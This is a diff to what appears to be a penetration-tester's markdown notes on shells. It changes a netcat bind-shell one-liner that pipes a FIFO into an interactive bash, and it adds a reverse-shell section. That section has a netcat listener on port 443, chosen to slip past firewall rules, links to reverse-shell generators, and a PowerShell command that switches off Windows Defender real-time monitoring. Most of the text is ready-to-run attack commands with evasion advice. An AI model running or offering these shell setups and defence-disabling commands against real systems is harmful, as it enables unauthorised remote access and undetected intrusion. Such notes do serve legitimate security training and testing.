@@ -41,7 +41,7 @@
 
 # Use nc to setup a shell
   1. Create FIFO folder, pipe bash to stdout, setup nc listener and any stdin will be put in the FIFO folder. This command is loop that passes messages from the nc listener into a file that is then pushed into a bash shell and outputted to stdout which is then sent back to the nc listener 
-    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [ip] [port] > /tmp/f
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [port] > /tmp/f
 
   2. Connect to the listener 
     nc -nv [ip] [port]
@@ -50,3 +50,21 @@
 <br>
 
 ### Reverse Shells
+```
+# Reverse shells setup a listener on the host and have the remote machine connect to them. This is typically a better option as oubound traffic rules are more relaxed than inbound, allowing for undetected engagement
+
+
+# Reverse Shell Code Cheat Sheet - Take a look at the Reverse Shell Generator 
+  1. https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+
+
+# Simple Reverse Shell - Using common ports is sometimes a way to avoid firewall rules
+  1. Start Listener on Host 
+    sudo nc -lvnp 443
+
+  2. Use Shell generator & disable windows monitoring 
+    https://www.revshells.com/
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+```
